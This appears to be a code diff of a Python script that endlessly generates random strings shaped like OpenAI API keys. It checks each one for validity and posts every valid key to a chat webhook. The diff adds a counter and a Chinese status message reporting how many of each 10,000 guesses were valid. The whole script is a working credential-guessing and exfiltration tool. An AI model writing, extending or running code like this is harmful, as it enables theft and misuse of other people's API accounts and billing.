@@ -46,12 +46,24 @@ def send(Key,st,bo):
         "text":{"content":Key+"\n"+st}
     }
     requests.post(url=bo,json=json)
+def send_msg(num,cnt,bo):
+    json={
+        "msgtype":"text",
+        "text":{"content":"共生成{}个Key，{}个有效".format(num,cnt)}
+    }
+    requests.post(url=bo,json=json)
+num=0
+cnt=0
 while True:
-    x=rd(1,100)
     Key="sk-"+g20()+"T3BlbkFJ"+g20()
+    num+=1
     if f(Key):
         st="合法"
         send(Key,st,bot)
-    if x==1:
-        send(Key,"测试-小号",bot2)
+        cnt+=1
+    if num==10000:
+        send_msg(num,cnt,bot)
+        num=0
+        cnt=0
+
     
